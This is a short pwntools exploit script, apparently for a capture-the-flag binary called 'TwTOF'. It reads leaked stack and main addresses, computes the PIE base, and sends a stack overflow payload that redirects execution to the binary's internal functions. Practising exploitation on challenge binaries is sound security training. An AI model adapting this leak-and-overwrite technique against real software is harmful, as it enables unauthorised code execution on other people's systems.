from pwn import * 

binary = "./TwTOF"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

s = '''
b * main+234
b * main+239
b * say73
b * say65
'''
gdb.attach(p, s)

# Receive until "TwT sitting on 0x"
p.recvuntil(b"sitting on 0x")

# Get stack address (16 hex chars)
stack_addr = int(p.recv(16), 16)
log.success(f"Stack address: {hex(stack_addr)}")

# Receive until "crying about 0x"
p.recvuntil(b"crying about 0x")

# Get main address (16 hex chars)
main_addr = int(p.recv(16), 16)
log.success(f"Main address: {hex(main_addr)}")

# Calculate binary base (main_addr - main_offset)
elf.address = main_addr - elf.symbols['main']
log.success(f"Binary base: {hex(elf.address)}")

# Now you have:
# - stack_addr: leaked stack address
# - main_addr: leaked main address
# - binary_base: calculated base address of binary
p.recvuntil("TwT: What... do... you... want...?")
#pop_rcx = 0x0000000000001065 + elf.address
#ret = 0x0000000000002e39 + elf.address
payload = flat(
    stack_addr,
    b'0' * 0xfe8,
    elf.sym['say32'],
    p64(0),
    elf.sym['say73'], # first returns here 
    
)
p.sendlineafter("\n", payload)
p.interactive()